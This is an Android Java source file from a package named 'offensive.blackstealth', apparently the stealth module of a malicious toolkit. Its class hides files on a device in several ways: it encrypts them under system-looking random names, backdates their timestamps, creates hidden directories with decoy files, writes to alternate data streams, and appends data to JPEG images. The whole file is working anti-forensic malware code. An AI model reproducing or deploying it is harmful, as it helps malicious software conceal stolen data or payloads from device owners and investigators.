package com.offensive.blackstealth.stealth;

import android.util.Log;
import java.io.*;
import java.security.SecureRandom;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

/**
 * FileSystemObfuscator - Hides and obfuscates files on the file system
 */
public class FileSystemObfuscator {
    private static final String TAG = "FileSystemObfuscator";
    private static final String AES = "AES/CBC/PKCS5Padding";
    private SecretKeySpec key;
    private SecureRandom random;
    
    public FileSystemObfuscator(byte[] encryptionKey) {
        this.key = new SecretKeySpec(encryptionKey, "AES");
        this.random = new SecureRandom();
    }
    
    /**
     * Hide a file by encrypting and giving it an innocent name
     */
    public File hideFile(File original, File targetDir) throws Exception {
        // Generate random filename that looks like system file
        String hiddenName = generateSystemFileName();
        File hidden = new File(targetDir, hiddenName);
        
        // Encrypt file contents
        byte[] content = readFile(original);
        byte[] encrypted = encrypt(content);
        writeFile(hidden, encrypted);
        
        // Set file timestamps to look old
        hidden.setLastModified(System.currentTimeMillis() - 86400000L * 365);
        
        return hidden;
    }
    
    /**
     * Reveal a hidden file by decrypting it
     */
    public byte[] revealFile(File hidden) throws Exception {
        byte[] encrypted = readFile(hidden);
        return decrypt(encrypted);
    }
    
    /**
     * Create a hidden directory with obfuscated name
     */
    public File createHiddenDirectory(File parent) {
        String[] systemNames = {".Trash", ".cache", ".tmp", ".data", ".sys"};
        String name = systemNames[random.nextInt(systemNames.length)] + random.nextInt(1000);
        
        File hidden = new File(parent, name);
        hidden.mkdirs();
        
        // Create decoy files
        try {
            new File(hidden, ".nomedia").createNewFile();
            writeFile(new File(hidden, "index.dat"), new byte[1024]);
        } catch (Exception e) {
            Log.e(TAG, "Failed to create decoys: " + e.getMessage());
        }
        
        return hidden;
    }
    
    /**
     * Store data in file's alternate data stream (ADS) - works on some filesystems
     */
    public boolean hideInAlternateStream(File file, String streamName, byte[] data) {
        try {
            File adsFile = new File(file.getPath() + ":" + streamName);
            writeFile(adsFile, data);
            return true;
        } catch (Exception e) {
            return false;
        }
    }
    
    /**
     * Steganography - hide data in image file
     */
    public boolean hideInImage(File imageFile, byte[] data) {
        try {
            byte[] imageData = readFile(imageFile);
            
            // Append data after image EOF marker (for JPEG)
            byte[] newData = new byte[imageData.length + data.length + 8];
            System.arraycopy(imageData, 0, newData, 0, imageData.length);
            
            // Add marker
            newData[imageData.length] = (byte) 0xDE;
            newData[imageData.length + 1] = (byte) 0xAD;
            newData[imageData.length + 2] = (byte) 0xBE;
            newData[imageData.length + 3] = (byte) 0xEF;
            
            // Add length
            int len = data.length;
            newData[imageData.length + 4] = (byte) ((len >> 24) & 0xFF);
            newData[imageData.length + 5] = (byte) ((len >> 16) & 0xFF);
            newData[imageData.length + 6] = (byte) ((len >> 8) & 0xFF);
            newData[imageData.length + 7] = (byte) (len & 0xFF);
            
            System.arraycopy(data, 0, newData, imageData.length + 8, data.length);
            
            writeFile(imageFile, newData);
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Failed to hide in image: " + e.getMessage());
            return false;
        }
    }
    
    private String generateSystemFileName() {
        String[] prefixes = {"cache_", "data_", "sys_", "lib_", "tmp_"};
        String[] extensions = {".dat", ".bin", ".tmp", ".log", ".db"};
        return prefixes[random.nextInt(prefixes.length)] + 
               Long.toHexString(random.nextLong()) + 
               extensions[random.nextInt(extensions.length)];
    }
    
    private byte[] encrypt(byte[] data) throws Exception {
        Cipher cipher = Cipher.getInstance(AES);
        byte[] iv = new byte[16];
        random.nextBytes(iv);
        cipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(iv));
        
        byte[] encrypted = cipher.doFinal(data);
        byte[] result = new byte[iv.length + encrypted.length];
        System.arraycopy(iv, 0, result, 0, iv.length);
        System.arraycopy(encrypted, 0, result, iv.length, encrypted.length);
        return result;
    }
    
    private byte[] decrypt(byte[] data) throws Exception {
        byte[] iv = new byte[16];
        System.arraycopy(data, 0, iv, 0, 16);
        
        Cipher cipher = Cipher.getInstance(AES);
        cipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(iv));
        return cipher.doFinal(data, 16, data.length - 16);
    }
    
    private byte[] readFile(File file) throws IOException {
        FileInputStream fis = new FileInputStream(file);
        byte[] data = new byte[(int) file.length()];
        fis.read(data);
        fis.close();
        return data;
    }
    
    private void writeFile(File file, byte[] data) throws IOException {
        FileOutputStream fos = new FileOutputStream(file);
        fos.write(data);
        fos.close();
    }
}
